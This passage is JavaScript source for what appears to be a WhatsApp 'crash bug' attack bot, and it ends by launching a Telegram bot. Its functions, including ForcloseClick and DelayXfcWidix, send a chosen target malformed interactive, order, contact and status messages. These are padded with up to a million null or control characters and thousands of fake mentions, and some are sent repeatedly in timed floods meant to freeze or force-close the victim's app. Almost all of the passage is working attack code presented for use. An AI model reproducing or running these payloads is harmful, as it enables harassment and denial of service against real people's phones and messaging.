          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Who's a King Widix?",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permissiom_request",
              paramsJson: "\u0010".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "call_permissiom_request"
            }
          }
        }
      }
    },
    {}
  );
}

async function ForcloseClick(sock, target) {
  let msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "SILENT KILLER"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "booking_status",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(90000),
                  phone_number: "00000000000000"
                })
              }
            ],
            version: 3
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function DelayXfcWidix(sock, target) {
  try {
    console.log(`[SILENT KILLER] Processing: ${target}`);

    const z = (s) => "\u0000".repeat(s);
    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const generateId = () => Math.random().toString(36).substring(2, 15);

    const generateWAMessageFromContent = (jid, content, options = {}) => {
      return {
        key: { remoteJid: jid, fromMe: true, id: generateId() },
        message: content,
        messageTimestamp: Math.floor(Date.now() / 1000),
        ...options
      };
    };

    for (let i = 0; i < 30; i++) {
      const msg = {
        orderMessage: {
          orderId: "1501854761618193",
          thumbnail: "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oooAooooAooooAooooD//Z",
          itemCount: 999999999,
          status: "ACCEPTED",
          surface: "CATALOG",
          message: "👁‍🗨⃟꙰ Widix The King ⌁ " + "ြ".repeat(10000),
          orderTitle: "ြ".repeat(10000),
          token: "AeC3SJ5C7he5nKiTugHjZ3rRsqGUJZt2nr149RuXX4C0uA==",
          totalAmount1000: -99999,
          catalogType: "NATIVE",
          messageVersion: 1,
          contextInfo: {
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/707338461_3976292309331713_8135566178339331181_n.enc?ccb=11-4&oh=01_Q5Aa4gFJmiZ2zt1tPyrCQqze7yCghpJQhqX7XjacBHToGtJ1pg&oe=6A3F3E05&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileName: "👁‍🗨⃟꙰ Zhatanixx The King ⌁ ꪸ⃟‼️",
                caption: "👁‍🗨⃟꙰ Zhatanixx The King ⌁ ꪸ⃟‼️" + z(35000),
                fileLength: "99999999",
                pageCount: 9999999999,
                mediaKey: "EeppnZN9jQv7dPD+rbPUnptaQdp7mx3wKLtjF6l3his=",
                fileSha256: "Am5pvBkNI4cauKljMh/arTTMUUREgakSWbsrYtCFt3Q=",
                fileEncSha256: "asY98UmRTmgMSTdtoVj5R450uaPO0FjeOC/N0AiWh/s=",
                directPath: "/v/t62.7119-24/577769056_2256173511783379_2555633243952296137_n.enc?ccb=11-4&oh=01_Q5Aa4gGaoMNbWIdtMxD8B8QXM7l-jJx9aw-LK11gERMY6XIv3g&oe=6A3F0D33&_nc_sid=5e03e0"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321123456789@newsletter",
              serverMessageId: 55,
              newsletterName: "👁‍🗨⃟꙰ Zhatanixx The King ⌁ ꪸ⃟‼",
              contentType: 3,
              accessibilityText: z(15000),
              profileName: "IAMZhatanixx"
            },
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
            ]
          }
        }
      };
      await sock.relayMessage(target, msg, { participant: { jid: target } });
      await wait(100);
    }

    await wait(500);

    const nullMessage = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "image/webp",
              height: 9999,
              width: 9999,
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
              fileLength: 12260,
              mediaKeyTimestamp: "1743832131",
              isAnimated: false,
              stickerSentTs: "X",
              isAvatar: false,
              isAiSticker: false,
              isLottie: false
            },
            body: { text: "Widix Buldo You" },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Widix\",\"tower_number\":\"Widix\",\"city\":\"chindo\",\"name\":\"Widix\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0010".repeat(1030000)}\"}}`,
              version: 3
            }
          }
        }
      }
    };

    const msg2 = await generateWAMessageFromContent(target, nullMessage, {});
    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });

    await wait(500);

    for (let x = 0; x < 50; x++) {
      const ccMsg = {
        groupStatusMessageV2: {
          message: {
            contactsArrayMessage: {
              displayName: "👁‍🗨⃟꙰ zhatanixx The King ⌁ ",
              contacts: Array.from({ length: 15 }, () => ({
                displayName: "👁‍🗨⃟꙰ zhatanixx The King ⌁ ",
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;👁‍🗨⃟꙰ zhatanixx The King ⌁  ${z(14000)};;;\nFN:👁‍🗨⃟꙰ zhatanixx The King ⌁  ${z(15000)}\nTEL;type=VOICE;waid=000:+000\nX-WA-BIZ-NAME:zhatanixx ${z(15000)}\nEND:VCARD`
              })),
              contextInfo: {
                remoteJid: "status@broadcast",
                participant: target,
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isForwarded: true,
                forwardingScore: 999,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                ],
                quotedAd: { caption: "X", advertiserName: "Widix", mediaType: "VIDEO" },
                actionLink: { url: "wa.me/Status", buttonTitle: "X" }
              }
            }
          }
        }
      };
      await sock.relayMessage(target, ccMsg, { participant: { jid: target } });
      await wait(100);
    }

    await wait(500);

    const delaynew = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { text: "ZhatanixxPemula🥶", format: "ENABLE" },
            nativeFlowResponseMessage: {
              name: "cta_url",
              paramsJson: `{"flow_cta":"${z(999999)}"}`,
              url: "https://t.me/zhatanixx",
              version: 3
            },
            disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" }
          }
        }
      }
    };
    await sock.relayMessage(target, delaynew, { participant: { jid: target } });

    await wait(500);

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: z(500000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
              ]
            }
          }
        }
      }
    }, { participant: { jid: target } });

    await wait(500);

    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: z(500000),
              contextInfo: {
                participant: target,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                ]
              }
            }
          }
        }
      }, { participant: { jid: target } });
      await wait(100);
    }

  } catch (error) {
    console.error(`[SILENT KILLER] Error: ${error.message}`);
  }
}

///========[ END FUN ]=====\\\
bot.launch()
